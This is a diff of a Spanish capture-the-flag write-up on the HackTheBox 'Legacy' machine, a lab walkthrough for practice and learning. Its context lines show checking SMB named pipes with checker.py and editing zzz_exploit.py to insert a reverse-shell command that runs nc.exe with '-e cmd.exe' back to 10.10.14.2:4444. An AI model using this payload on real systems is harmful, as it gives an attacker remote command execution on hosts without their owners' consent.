@@ -33,6 +33,7 @@ Ejecutamos el checker.py para comprobar syi los named pipes responden
     python2 checker.py 10.10.10.4
 
 Comprobamos que el spoolss y el browser son vulnerables.
+
 ![](https://github.com/b14nc0/CTF/blob/main/HTB/images/legacy/checker.jpg)
 
 
@@ -43,6 +44,7 @@ Ahora vamos a explotar la vulnerabilidad con el zzz_exploit.py pero antes tenemo
 ![](https://github.com/b14nc0/CTF/blob/main/HTB/images/legacy/cp.jpg)
 
 2.- editamos el exploit para indicarle como va a ser nuestra reverse shell.
+
 Comentamos las lineas que ya no queremos que se ejecuten (flecha de arriba) e incluimos nuestra ejecucion (flecha de abajo)
 
      service_exec(conn, r'cmd /c \\10.10.14.2\smb\nc.exe -e cmd.exe 10.10.14.2 4444')
